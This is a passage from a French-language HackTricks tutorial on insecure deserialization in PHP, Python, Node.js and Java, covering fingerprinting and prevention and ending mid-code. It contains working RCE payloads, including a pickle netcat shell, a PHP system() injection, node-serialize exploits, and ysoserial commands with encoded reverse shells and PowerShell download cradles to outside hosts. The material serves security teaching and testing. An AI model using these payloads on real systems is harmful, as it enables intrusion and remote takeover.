# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

**Serialization** est comprise comme la méthode de conversion d'un objet en un format pouvant être conservé, dans l'intention soit de stocker l'objet soit de le transmettre dans le cadre d'une communication. Cette technique est couramment employée pour s'assurer que l'objet peut être recréé ultérieurement, en conservant sa structure et son état.

**Deserialization**, en revanche, est le processus qui contrecarre la serialization. Il consiste à prendre des données structurées dans un format spécifique et à les reconstruire en un objet.

Deserialization peut être dangereuse car elle peut potentiellement **permettre à des attaquants de manipuler les serialized data pour exécuter du code malveillant** ou provoquer un comportement inattendu de l'application lors du processus de reconstruction de l'objet.

## PHP

Dans PHP, des magic methods spécifiques sont utilisées pendant les processus de serialization et de deserialization :

- `__sleep`: Appelé lorsqu'un objet est en cours de serialization. Cette méthode doit renvoyer un tableau contenant les noms de toutes les propriétés de l'objet qui doivent être serialized. Elle est couramment utilisée pour valider des données en attente ou effectuer des tâches de nettoyage similaires.
- `__wakeup`: Appelé lorsqu'un objet est en cours de deserialization. Il est utilisé pour rétablir les connexions à la base de données qui ont pu être perdues pendant la serialization et effectuer d'autres tâches de réinitialisation.
- `__unserialize`: Cette méthode est appelée à la place de `__wakeup` (si elle existe) lorsqu'un objet est en cours de deserialization. Elle offre un contrôle plus fin sur le processus de deserialization par rapport à `__wakeup`.
- `__destruct`: Cette méthode est appelée lorsqu'un objet est sur le point d'être détruit ou à la fin du script. Elle est typiquement utilisée pour des tâches de nettoyage, comme fermer des handles de fichiers ou des connexions à la base de données.
- `__toString`: Cette méthode permet de traiter un objet comme une chaîne. Elle peut être utilisée pour lire un fichier ou effectuer d'autres tâches basées sur les appels de fonction qu'elle contient, fournissant ainsi une représentation textuelle de l'objet.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si vous regardez les résultats, vous pouvez voir que les fonctions **`__wakeup`** et **`__destruct`** sont appelées lorsque l'objet est désérialisé. Notez que dans plusieurs tutoriels, vous trouverez que la fonction **`__toString`** est appelée lorsqu'on tente d'afficher un attribut, mais apparemment cela **n'arrive plus**.

> [!WARNING]
> La méthode **`__unserialize(array $data)`** est appelée **au lieu de `__wakeup()`** si elle est implémentée dans la classe. Elle permet de désérialiser l'objet en fournissant les données sérialisées sous forme de tableau. Vous pouvez utiliser cette méthode pour désérialiser les propriétés et effectuer les opérations nécessaires lors de la désérialisation.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Vous pouvez lire un exemple PHP expliqué ici : [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ici [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou ici [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Vous pouvez abuser de la fonctionnalité autoload de PHP pour charger des fichiers php arbitraires et plus encore :

{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Sérialiser des valeurs référencées

Si pour une raison quelconque vous souhaitez sérialiser une valeur comme **référence à une autre valeur sérialisée**, vous pouvez :
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Prévenir PHP Object Injection avec `allowed_classes`

> [!INFO]
> Le support du **deuxième argument** de `unserialize()` (le tableau `$options`) a été ajouté dans **PHP 7.0**. Sur les versions plus anciennes la fonction n'accepte que la chaîne sérialisée, rendant impossible la restriction des classes pouvant être instanciées.

`unserialize()` va **instancier chaque classe** qu'il trouve dans le flux sérialisé sauf indication contraire. Depuis PHP 7 le comportement peut être restreint avec l'option [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) :
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Si **`allowed_classes` est omis _ou_ si le code s'exécute sur PHP < 7.0**, l'appel devient **dangereux** car un attaquant peut fabriquer un payload qui abuse des méthodes magiques telles que `__wakeup()` ou `__destruct()` pour obtenir Remote Code Execution (RCE).

#### Exemple réel : Everest Forms (WordPress) CVE-2025-52709

Le plugin WordPress **Everest Forms ≤ 3.2.2** a essayé d'être défensif avec un wrapper d'aide mais a oublié les anciennes versions de PHP :
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Sur les serveurs tournant encore sous **PHP ≤ 7.0**, cette seconde branche menait à une classique **PHP Object Injection** lorsqu'un administrateur consultait une soumission de formulaire malveillante. Un exploit payload minimal pourrait ressembler à :
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Dès que l'admin a consulté l'entrée, l'objet a été instancié et `SomeClass::__destruct()` a été exécuté, entraînant une exécution de code arbitraire.

**Points clés**
1. Transmettez toujours `['allowed_classes' => false]` (ou une liste blanche stricte) lors de l'appel à `unserialize()`.
2. Auditez les wrappers défensifs — ils oublient souvent les branches PHP héritées.
3. La mise à niveau vers **PHP ≥ 7.x** seule n'est *pas* suffisante : l'option doit toujours être fournie explicitement.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) peut vous aider à générer des payloads pour abuser des désérialisations PHP.\
Notez que dans plusieurs cas vous **ne pourrez pas trouver de moyen d'abuser d'une désérialisation dans le code source** de l'application mais vous pourrez peut‑être **abuser du code d'extensions PHP externes.**\ Donc, si vous le pouvez, vérifiez le `phpinfo()` du serveur et **recherchez sur internet** (y compris parmi les **gadgets** de **PHPGGC**) des gadgets possibles que vous pourriez exploiter.

### phar:// désérialisation des métadonnées

Si vous avez trouvé un LFI qui se contente de lire le fichier et n'exécute pas le code php qu'il contient, par exemple en utilisant des fonctions comme _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Vous pouvez essayer d'abuser d'une **désérialisation** se produisant lors de la **lecture** d'un **fichier** en utilisant le protocole **phar**.\
Pour plus d'informations read the following post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Quand l'objet est désérialisé, la fonction \_\_\_reduce\_\_\_ sera exécutée.\
Lorsqu'il est exploité, le serveur pourrait renvoyer une erreur.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Avant de vérifier la technique de contournement, essayez d'utiliser `print(base64.b64encode(pickle.dumps(P(),2)))` pour générer un objet compatible avec python2 si vous exécutez python3.

Pour plus d'informations sur l'évasion des **pickle jails** consultez :


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

La page suivante présente la technique pour **abuser d'une désérialisation non sécurisée dans les bibliothèques python de YAML** et se termine par un outil pouvant être utilisé pour générer RCE deserialization payload pour **Pickle, PyYAML, jsonpickle and ruamel.yaml** :


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **n'a pas de fonctions "magiques"** comme PHP ou Python qui vont être exécutées simplement lors de la création d'un objet. Mais il existe certaines **fonctions** qui sont **fréquemment utilisées même sans être appelées directement**, telles que **`toString`**, **`valueOf`**, **`toJSON`**.\
Si vous abusez d'une désérialisation, vous pouvez **compromettre ces fonctions pour exécuter d'autres code** (potentiellement en abusant de prototype pollutions) et ainsi exécuter du code arbitraire lorsqu'elles sont appelées.

Une autre **façon "magique" d'appeler une fonction** sans l'appeler directement est de **compromettre un objet qui est renvoyé par une fonction async** (promise). En effet, si vous **transformez** cet **objet de retour** en une autre **promise** avec une **propriété** appelée **"then" de type function**, elle sera **exécutée** simplement parce qu'elle est retournée par une autre promise. _Suivez_ [_**ce lien**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _pour plus d'infos._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Si vous voulez en savoir plus sur cette technique **jetez un œil au tutoriel suivant** :

{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Cette bibliothèque permet de sérialiser des fonctions. Exemple :
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
L'**objet sérialisé** ressemblera à :
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Vous pouvez voir dans l'exemple que lorsqu'une fonction est sérialisée le `_$$ND_FUNC$$_` flag est appendu à l'objet sérialisé.

À l'intérieur du fichier `node-serialize/lib/serialize.js` vous pouvez trouver le même flag et voir comment le code l'utilise.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Comme vous pouvez le voir dans le dernier extrait de code, **si le flag est trouvé** `eval` est utilisé pour désérialiser la fonction, donc en gros **l'entrée utilisateur est utilisée à l'intérieur de la fonction `eval`**.

Cependant, **simplement sérialiser** une fonction **ne l'exécutera pas**, car il faudrait qu'une partie du code **appelle `y.rce`** dans notre exemple et c'est très **peu probable**.\
Quoi qu'il en soit, vous pouvez simplement **modifier l'objet sérialisé** **en ajoutant des parenthèses** afin d'exécuter automatiquement la fonction sérialisée lorsque l'objet est désérialisé.\
Dans le prochain extrait de code **remarquez la dernière parenthèse** et comment la fonction `unserialize` exécutera automatiquement le code :
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Comme indiqué précédemment, cette bibliothèque récupérera le code après `_$$ND_FUNC$$_` et **l'exécutera** en utilisant `eval`. Par conséquent, afin d'**auto-exécuter du code**, vous pouvez **supprimer la partie de création de la fonction** et la dernière parenthèse et **simplement exécuter un JS oneliner** comme dans l'exemple suivant :
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Vous pouvez [**trouver ici**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) des **informations supplémentaires** sur la manière d'exploiter cette vulnérabilité.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspect notable de **funcster** est l'inaccessibilité des **objets intégrés standard** ; ils se trouvent en dehors du scope accessible. Cette restriction empêche l'exécution de code qui tente d'appeler des méthodes sur les objets intégrés, entraînant des exceptions telles que `"ReferenceError: console is not defined"` lorsque des commandes comme `console.log()` ou `require(something)` sont utilisées.

Malgré cette limitation, il est possible de restaurer l'accès complet au contexte global, incluant tous les objets intégrés standard, grâce à une approche spécifique. En tirant parti du contexte global directement, on peut contourner cette restriction. Par exemple, l'accès peut être rétabli en utilisant le snippet suivant :
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Pour**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Le package **serialize-javascript** est conçu uniquement pour la serialization et ne dispose d'aucune capacité de deserialization intégrée. Les utilisateurs doivent implémenter leur propre méthode de deserialization. L'exemple officiel suggère l'utilisation directe de `eval` pour deserializing serialized data:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Si cette fonction est utilisée pour deserialize des objets vous pouvez **easily exploit it**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Pour**[ **plus d'informations, lisez cette source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

Dans les pages suivantes, vous trouverez des informations sur la manière d'abuser de cette library pour exécuter des commandes arbitraires :

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

En Java, **deserialization callbacks are executed during the process of deserialization**. Cette exécution peut être exploitée par des attaquants qui créent des payloads malveillants déclenchant ces callbacks, conduisant potentiellement à l'exécution d'actions nuisibles.

### Fingerprints

#### White Box

Pour identifier d'éventuelles vulnérabilités de serialization dans la base de code, recherchez :

- Classes qui implémentent l'interface `Serializable`.
- Utilisation de `java.io.ObjectInputStream`, des fonctions `readObject`, `readUnshare`.

Portez une attention particulière à :

- `XMLDecoder` utilisé avec des paramètres fournis par des utilisateurs externes.
- La méthode `fromXML` de `XStream`, surtout si la version de XStream est inférieure ou égale à 1.46, car elle est susceptible de problèmes de serialization.
- `ObjectInputStream` couplé avec la méthode `readObject`.
- Implémentation de méthodes telles que `readObject`, `readObjectNodData`, `readResolve`, ou `readExternal`.
- `ObjectInputStream.readUnshared`.
- Usage général de `Serializable`.

#### Black Box

Pour le test black box, recherchez des **signatures or "Magic Bytes"** spécifiques qui indiquent des objets java sérialisés (provenant de `ObjectInputStream`) :

- Motif hexadécimal : `AC ED 00 05`.
- Motif Base64 : `rO0`.
- En-têtes de réponse HTTP avec `Content-type` défini sur `application/x-java-serialized-object`.
- Motif hexadécimal indiquant une compression préalable : `1F 8B 08 00`.
- Motif Base64 indiquant une compression préalable : `H4sIA`.
- Fichiers web avec l'extension `.faces` et le paramètre `faces.ViewState`. La découverte de ces motifs dans une application web devrait conduire à un examen comme détaillé dans le [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Vérifier si vulnérable

Si vous voulez **comprendre comment fonctionne un Java Deserialized exploit**, vous devriez consulter [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), et [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization et atteignabilité pré-auth

Les codebases modernes encapsulent parfois la deserialization avec `java.security.SignedObject` et valident une signature avant d'appeler `getObject()` (qui désérialise l'objet interne). Cela empêche les classes gadget arbitraires au niveau top-level mais peut rester exploitable si un attaquant parvient à obtenir une signature valide (par ex., compromission de la clé privée ou un signing oracle). De plus, les flux de gestion d'erreurs peuvent générer des jetons liés à la session pour les utilisateurs non authentifiés, exposant des sinks normalement protégés pre-auth.

Pour une étude de cas concrète avec des requêtes, IoCs et des recommandations de durcissement, voir :

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### Test White Box

Vous pouvez vérifier si une application connue vulnérable est installée.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Vous pouvez essayer de **vérifier toutes les bibliothèques** connues pour être vulnérables et pour lesquelles [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Vous pouvez aussi utiliser [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) pour rechercher d'éventuelles gadget chains exploitables.\
Quand vous lancez **gadgetinspector** (après l'avoir compilé), ne vous préoccupez pas des tonnes d'avertissements/erreurs qu'il affiche et laissez-le terminer. Il écrira toutes les trouvailles sous _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Veuillez noter que **gadgetinspector ne créera pas d'exploit et peut indiquer des faux positifs**.

#### Test en boîte noire

En utilisant l'extension Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) vous pouvez identifier **quelles bibliothèques sont disponibles** (et même les versions). Avec cette information il peut être **plus facile de choisir un payload** pour exploiter la vulnérabilité.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe se concentre sur les **`ObjectInputStream` deserializations**.

En utilisant l'extension Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) vous pouvez **identifier vulnerable libraries** exploitables avec ysoserial et **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner se concentre sur les désérialisations **`ObjectInputStream`**.

Vous pouvez aussi utiliser [**Freddy**](https://github.com/nccgroup/freddy) pour **detect deserializations** vulnerabilities dans **Burp**. Ce plugin détectera **not only `ObjectInputStream`** related vulnerabilities mais **aussi** les vulnérabilités provenant des bibliothèques de désérialisation **Json** et **Yml**. En mode actif, il tentera de les confirmer en utilisant des payloads sleep ou DNS.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test de sérialisation**

Il ne s'agit pas seulement de vérifier si une bibliothèque vulnérable est utilisée par le serveur. Parfois vous pouvez **modifier les données à l'intérieur de l'objet sérialisé et bypass certains contrôles** (peut-être vous accorder des privilèges admin dans une webapp).\
Si vous trouvez un java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Savoir quelles données vous envoyez facilitera leur modification et le contournement de certaines vérifications.

### **Exploit**

#### **ysoserial**

L'outil principal pour exploiter les désérialisations Java est [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Vous pouvez aussi envisager d'utiliser [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) qui vous permettra d'utiliser des commandes complexes (avec des pipes par exemple).\
Notez que cet outil est **focused** sur l'exploitation des **`ObjectInputStream`**.\
Je recommanderais de **start using the "URLDNS"** payload **before a RCE** payload pour tester si l'injection est possible. Quoi qu'il en soit, notez que le payload "URLDNS" peut ne pas fonctionner alors qu'un autre payload RCE fonctionne.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Lors de la création d'un payload pour **java.lang.Runtime.exec()** vous **cannot use special characters** comme ">" ou "|" pour rediriger la sortie d'une exécution, "$()" pour exécuter des commandes ou même **pass arguments** à une commande séparés par des **spaces** (vous pouvez faire `echo -n "hello world"` mais vous ne pouvez pas faire `python2 -c 'print "Hello world"'`). Pour encoder correctement le payload vous pouvez [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

N'hésitez pas à utiliser le script suivant pour créer **all the possible code execution** payloads pour Windows et Linux puis les tester sur la page web vulnérable :
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Vous pouvez **utiliser** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **avec ysoserial pour créer davantage d'exploits**. Plus d'informations sur cet outil dans les **slides de la présentation** où l'outil a été présenté : [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) peut être utilisé pour générer des payloads pour exploiter différentes bibliothèques de sérialisation **Json** et **Yml** en **Java**.\
Pour compiler le projet, j'ai dû **ajouter** ces **dépendances** dans `pom.xml` :
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installez maven**, et **compilez** le projet:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

En savoir plus sur cette bibliothèque Java JSON : [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

- Si vous voulez tester des ysoserial payloads, vous pouvez **exécuter cette webapp** : [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Pourquoi

Java utilise beaucoup la sérialisation pour divers usages, tels que :

- **HTTP requests** : la sérialisation est largement employée dans la gestion des paramètres, ViewState, cookies, etc.
- **RMI (Remote Method Invocation)** : le protocole Java RMI, qui repose entièrement sur la sérialisation, est une pierre angulaire de la communication distante dans les applications Java.
- **RMI over HTTP** : cette méthode est couramment utilisée par les applications web à client lourd basées sur Java, utilisant la sérialisation pour toutes les communications d'objets.
- **JMX (Java Management Extensions)** : JMX utilise la sérialisation pour transmettre des objets sur le réseau.
- **Custom Protocols** : en Java, la pratique standard implique la transmission d'objets Java bruts, ce qui sera démontré dans les exploit examples à venir.

### Prévention

#### Objets transient

Une classe qui implémente `Serializable` peut marquer comme `transient` tout objet à l'intérieur de la classe qui ne devrait pas être sérialisable. Par exemple :
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
